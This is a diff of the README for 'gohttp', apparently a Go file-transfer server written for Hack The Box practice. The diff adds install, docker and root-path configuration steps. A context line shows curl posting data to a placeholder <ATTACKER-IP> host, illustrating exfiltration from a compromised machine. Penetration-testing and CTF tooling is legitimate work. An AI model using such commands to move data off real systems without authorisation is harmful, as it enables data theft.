@@ -3,13 +3,15 @@ While playing on *hackthebox.com* I was missing the capability to upload files f
 Therefore I wrote **gohttp** which supports both uploading and downloading files just by using the go standard library.
 
 ## Installation
-### easy install
+### go install
 ```bash
 go install github.com/hebelsan/gohttp
+./gohttp
 ```
 ### docker
 ```bash
-TODO
+docker pull TODO
+docker run --rm -v $(pwd):/mount -p 80:80 gohttp
 ```
 ### manual
 ```bash
@@ -41,6 +43,13 @@ curl -H "filename: test.txt" --data "this is raw data" http://<ATTACKER-IP>/
 ```
 
 ## Configuration
+
+### Files root path
+Per default every file is transferred from and to the current working directory.  
+To change this behaviour:
+```bash
+export FILES_ROOT=/tmp
+```
 
 ### Authentication
 If you are scared that somebody else in your network 
